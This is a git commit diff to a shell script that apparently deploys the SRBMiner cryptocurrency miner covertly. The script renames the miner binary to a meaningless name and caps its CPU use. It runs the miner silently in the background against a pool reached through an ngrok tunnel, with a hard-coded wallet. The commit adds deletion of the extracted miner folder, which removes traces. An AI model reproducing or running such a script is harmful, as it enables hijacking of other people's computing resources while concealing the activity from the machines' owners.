d6a69283e7da9733a02d49eef09d5c9be96c3b1a
HellDarkK <86185393+SankuNetwork@users.noreply.github.com>
2023-07-30 10:14:09 +0700

    Update SRBMine.sh

--- mnr/cpulimited/400/SRBMine.sh
+++ mnr/cpulimited/400/SRBMine.sh
@@ -9,5 +9,6 @@ cd SRBMiner-Multi-2-3-1/
 mv SRBMiner-MULTI  ..
 cd ..
 mv SRBMiner-MULTI TSARPR
+rm -rf SRBMiner-Multi-2-3-1/
 sudo cpulimit --background -e TSARPR -l 400
 nohup ./TSARPR--algorithm verushash --pool stratum+ssl://2.tcp.ngrok.io:11730 --wallet RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq --password c=VRSC,id=YANTO$(( $RANDOM % 1000 + 1 )) --cpu-threads 0 --disable-gpu &> /dev/null &
